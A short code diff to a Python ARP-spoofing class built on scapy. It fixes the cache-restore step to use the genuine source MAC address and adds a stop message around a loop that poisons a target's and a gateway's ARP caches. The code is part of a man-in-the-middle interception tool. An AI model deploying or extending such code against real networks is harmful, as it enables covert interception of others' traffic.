@@ -24,7 +24,7 @@ class ArpSpoofer:
 
     def restore(self, destinationIP, sourceIP):
         packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=scapy.getmacbyip(destinationIP), psrc=sourceIP,
-                           hwsrc=self.sourceMAC)
+                           hwsrc=scapy.getmacbyip(sourceIP))
         scapy.send(packet, count=4, verbose=False)
 
     def start(self):
@@ -33,13 +33,13 @@ class ArpSpoofer:
         while self.on:
             self.spoofer(self.targetIP, self.gatewayIP)
             self.spoofer(self.gatewayIP, self.targetIP)
-           # print("\r[+] Sent packets " + str(packets)),
-            # sys.stdout.flush()
             packets += 2
             time.sleep(1)
 
         self.restore(self.targetIP, self.gatewayIP)
         self.restore(self.gatewayIP, self.targetIP)
+        print("stopped arp spoofing")
+
 
     def set_on(self, input):
         if input=='stop':
